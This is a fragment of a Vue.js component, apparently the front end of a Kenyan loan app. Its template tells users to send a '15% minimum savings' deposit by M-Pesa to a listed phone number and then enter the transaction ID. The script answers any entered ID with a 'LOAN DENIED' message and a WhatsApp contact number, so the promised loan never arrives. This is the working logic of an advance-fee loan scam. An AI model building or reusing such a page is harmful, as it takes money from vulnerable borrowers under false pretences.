            ...
            <div class="">
                ...
                <p class="" v-if="!step.show2">
                    ...
                    <ul class="list-decimal text-sm ml-8">
                        ...
                        <li>Select 4(Send to other Network) </li>
                        <li>Enter our office number as 254781102523 </li>
                        <li>Enter your 15% minimun savings as Ksh {{savings}}  </li>
                        <li>Enter your M-Pesa pin.  </li>
                        <li>Copy the transaction ID from the SMS confirmation received on phone of the type PC2RKHHDI. 
                ...
                <div class="mt-12 grid grid-cols-1 gap-y-6">
                    ...
                    <div v-if="!step.show6" class="grid grid-cols-1 text-left w-[360px] mx-auto space-y-6 text-black">
                       ...
                       <div class=" p-3 rounded-full w-20 md:left-3 md:top-1 z-10 bg-transparent fixed right-3 top-1">
                        <img  class="h-[35px]" :src="'/images/kenya.png' " alt="">
...
export default {
    ...
    methods: {
        prompt(){
            this.alert=prompt(' PLEASE ENTER THE TRANSACTION ID AFTER SAVING OF THE REQUIRED MINIMUM DEPOSIT OF Ksh'+this.savings+ ' eg FTYHK87HT4')
        },
    },
    computed: {
        confirm(){
            if(this.alert!=null){
                return prompt('LOAN DENIED-PLEASE SAVE THE MINIMUM REQUIRED DEPOSIT OF 15% AND ENTER THE TRANSACTION ID. ALS WILL DETECT THE TRANSACTION ID AND DISBURSE THE LOAN INSTANTLY. eg LLTWP118JD. HELP WHATSAPP/CALL/SMS +254772061697.')
            }
        },
        state(){
